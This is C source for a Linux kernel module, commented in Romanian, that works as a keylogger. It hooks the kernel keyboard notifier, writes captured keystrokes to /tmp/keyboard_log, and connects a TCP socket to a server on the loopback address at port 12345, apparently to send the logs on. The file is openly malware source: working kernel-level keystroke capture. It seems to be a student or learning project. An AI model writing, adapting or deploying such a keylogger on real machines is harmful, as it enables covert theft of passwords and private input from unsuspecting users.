#include "struct_keylogger.h"
#include "keyboard_callback.h"
#include "write_to_file.h"
#include <linux/ktime.h>

#define LOG_FILE_PATH "/tmp/keyboard_log"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Raluca+Bogdan");
MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");
MODULE_VERSION("0.1");

static unsigned int generate_unique_id(void) {
    u64 timestamp = ktime_get_real_ns(); // Timpul curent în nanosecunde
    return (unsigned int)(timestamp %99999); // Returnează doar o parte (32 biți)
}

static struct KEYLOGGER *keylogger;
struct sockaddr_in server_addr;

static int __init keyboard_logger_init(void) 
{
    pr_info("Step 1: Allocating memory for keylogger\n");
    keylogger=kzalloc(sizeof(KEYLOGGER),GFP_KERNEL);//kzalloc seteaza cu 0 peste tot
    if(keylogger==NULL)
    {
        pr_err("Nu se poate aloca memorie pt keylogger\n");
        kfree(keylogger);
        return -ENOMEM;
    }
    //mutex_init(&(clipboard->lock));

    keylogger->id = generate_unique_id();
    pr_info("Keylogger initialized with ID: %d\n", keylogger->id);

    keylogger->key_notifier.notifier_call=keyboard_callback;
    
    INIT_WORK(&keylogger->work_struct,&write_to_file);//leaga workqueue cu functia(handler)

    if(IS_ERR(keylogger->filename = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
    {
        pr_info("Unable to create a log file\n");
    	return -EINVAL;
	}
    keylogger->keyboard_read_buffer=keylogger->main_buffer;
    keylogger->write_buffer=keylogger->back_buffer;

    if(sock_create(AF_INET,SOCK_STREAM,0,&keylogger->socket)<0)
        {
            pr_info("Unable to create socket\n");
            return -EINVAL;
        }
    
    memset(&server_addr,0,sizeof(server_addr));
    server_addr.sin_family=AF_INET;
    server_addr.sin_port=htons(12345);
    server_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if(keylogger->socket->ops->connect(keylogger->socket,(struct sockaddr*)(&server_addr),sizeof(server_addr),0)<0)
    {
        pr_err("Unable to connect to server\n");
        sock_release(keylogger->socket);
        return -ECONNREFUSED;
    }
    

    register_keyboard_notifier(&keylogger->key_notifier);


   

    return 0;
}

static void __exit keyboard_logger_exit(void) {
    if (keylogger) {
        flush_work(&keylogger->work_struct);     // Orice alt task asociat work_struct

        // De-înregistrează notifier-ul de la tastatură
        unregister_keyboard_notifier(&keylogger->key_notifier);

        // Închide fișierul dacă a fost deschis
        if (keylogger->filename) {
            filp_close(keylogger->filename, NULL);
        }
        if (keylogger->socket)
            sock_release(keylogger->socket);
        // Eliberează memoria
        kfree(keylogger);
    }
}

module_init(keyboard_logger_init);
module_exit(keyboard_logger_exit);